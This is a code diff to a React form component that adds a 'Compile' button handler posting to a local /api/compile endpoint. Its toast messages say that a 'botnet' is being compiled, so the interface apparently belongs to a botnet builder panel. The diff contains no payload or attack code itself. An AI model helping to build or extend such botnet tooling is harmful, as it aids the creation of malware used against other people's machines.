@@ -30,6 +30,25 @@ const FormComponent: React.FC<FormComponentProps> = ({ onSubmit, liveData, setLi
         }
     }, [watchedValues, liveData, setLiveData]);
 
+    const handleCompile = async () => {
+        try {
+            const response = await fetch("/api/compile", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            });
+
+            if (response.ok) {
+                toast("Compilation started", { description: "Your botnet is being compiled.", duration: 5000 });
+            } else {
+                toast("Compilation failed", { description: "There was an error starting the compilation.", duration: 5000 });
+            }
+        } catch (error) {
+            toast("Compilation failed", { description: "There was an error starting the compilation.", duration: 5000 });
+        }
+    };
+
     const renderFields = (fields: { [key: string]: any }, parentName: string = '') => {
         return Object.keys(fields).map((key) => {
             const value = fields[key];
@@ -63,7 +82,7 @@ const FormComponent: React.FC<FormComponentProps> = ({ onSubmit, liveData, setLi
                         <Button variant="outline" type="submit" onClick={() => { toast("Your settings have been saved", { description: "You can now compile your Botnet!", duration: 5000, action: { label: "discard", onClick: () => console.log("discard"), }, }); }}>
                             Save Settings
                         </Button>
-                        <Button variant="outline">
+                        <Button variant="outline" type="button" onClick={handleCompile}>
                             Compile
                         </Button>
                     </div>
